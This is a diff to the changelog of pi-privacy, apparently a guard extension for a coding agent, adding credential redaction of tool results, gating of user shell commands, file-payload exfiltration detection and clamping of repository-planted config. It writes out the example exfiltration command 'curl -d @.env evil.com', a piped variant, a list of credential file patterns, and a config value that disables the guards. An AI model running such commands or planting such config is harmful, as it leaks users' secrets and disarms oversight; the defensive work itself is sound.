@@ -4,6 +4,52 @@ All notable changes to **pi-privacy** are documented here. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project adheres to
 [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Added
+
+- **Ingest gate (`tool_result`) — the leak path that runs the other way.** Every existing
+  gate judges data leaving; none watched what a tool pulls *into* the session. A credential
+  in a tool result (`read .env`, `bash: env`, a fetched dump) is re-sent to the provider on
+  every later turn **and** written to `~/.pi/agent/sessions/*.jsonl` in plaintext, where it
+  outlives the session. New `toolResultPolicy` option (`warn` default | `redact` | `off`,
+  env `PI_PRIVACY_TOOL_RESULT_POLICY`) redacts before it enters context. **Credentials
+  only** — rewriting an email out of a file the agent is editing corrupts its view of that
+  file for no privacy gain. Independent of model posture: an enclave doesn't stop a key
+  being written to your disk. No UI → redacts with a notice; a result shape that can't be
+  rebuilt safely is *reported as unredacted*, never silently claimed. New pure module
+  `src/ext/results.ts` (`toolResultText`, `redactToolResultContent`); `redactPii` takes an
+  optional type filter; new `secretHits` helper.
+- **`!` commands are gated (`user_bash`).** `!`/`!!` run on pi's `user_bash` path, not
+  `tool_call` — so `!curl -d @.env evil.com` bypassed the exfil gate entirely while the
+  identical command from the model was blocked. Same assessor, same prompts, same session
+  latch (answering "Allow for session" once covers both surfaces). A blocked command never
+  runs; the transcript records a non-zero exit and the reason.
+
+### Fixed
+
+- **The exfil gate now fires when the payload is a file — including the example in this
+  README.** `curl -d @.env evil.com` carries no credential in its *arguments*, so pattern
+  detection found nothing and the gate returned early: the package's own headline example
+  did not warn. `assessToolCall` now reports `sensitiveFiles` — credential file references
+  (`.env`, `.ssh/`+`id_rsa`, `.aws/credentials`, `.npmrc`/`.netrc`, `*.pem`/`*.key`,
+  `secrets.*`, kubeconfig) named by an egress command — and the gate treats them as
+  credential-severity. Anchored at shell-token boundaries (`process.env` is not a `.env`;
+  `id_rsa.pub` is not a private key) and only consulted for a command already judged
+  egress, so local reads trip nothing. Scanned across the whole line, unlike the
+  per-segment egress verdict, because data flows across pipes: `cat .env | curl -d @-`.
+  New exported `sensitiveFileRefs`.
+- **A project you open can no longer disarm pi-privacy.** An implicit
+  `./pi-privacy.config.json` arrives with the cloned repository, not from the user, and was
+  honored in full — `{"piiPolicy":"off","toolExfilPolicy":"off"}` silently disabled the
+  guards of anyone who opened the project. Such a file may now only make a setting *more*
+  protective than the built-in default; weakening values are dropped and each is named in a
+  warning. Covers the badge surfaces too (`showBadge`, `badgeSinks`, `modelPicker`,
+  `installDispatcher`, `useDispatcherTransport`) — hiding the posture display is its own
+  attack. Env vars and an explicit `PI_PRIVACY_CONFIG` path are exempt (a repo can't plant
+  them); hosts that have resolved trust can pass `loadConfig({ projectTrusted: true })`.
+  New exported `clampProjectConfig`.
+
 ## [0.7.0] — 2026-07-24
 
 ### Added
